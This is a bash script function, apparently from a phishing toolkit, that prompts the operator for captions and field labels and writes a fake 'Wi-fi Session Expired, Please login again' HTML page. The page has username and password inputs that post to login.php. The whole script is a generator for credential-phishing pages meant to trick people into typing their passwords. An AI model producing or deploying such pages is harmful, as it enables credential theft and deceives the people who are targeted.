#!/usr/bin/env bash

createpage() {
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
        cap1="${cap1:-${default_cap1}}"
        read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
            cap2="${cap2:-${default_cap2}}"
            read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
                user_text="${user_text:-${default_user_text}}"
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
                    pass_text="${pass_text:-${default_pass_text}}"
                    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
                    sub_text="${sub_text:-${default_sub_text}}"

    echo "<!DOCTYPE html>" > webpages/create/login.html
    echo "<html>" >> webpages/create/login.html
    echo "<body bgcolor=\"gray\" text=\"white\">" >> webpages/create/login.html
    IFS=$'\n'
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> webpages/create/login.html
        IFS=$'\n'
        printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> webpages/create/login.html
        IFS=$'\n'
        printf '<input type="text" name="username" length=64>\n' >> webpages/create/login.html
        IFS=$'\n'
        printf '<br><label>%s: </label>' $pass_text >> webpages/create/login.html
        IFS=$'\n'
        printf '<input type="password" name="password" length=64><br><br>\n' >> webpages/create/login.html
        IFS=$'\n'
        printf '<input value="%s" type="submit"></form>\n' $sub_text >> webpages/create/login.html
        printf '</center>' >> webpages/create/login.html
        printf '<body>\n' >> webpages/create/login.html
        printf '</html>\n' >> webpages/create/login.html
}
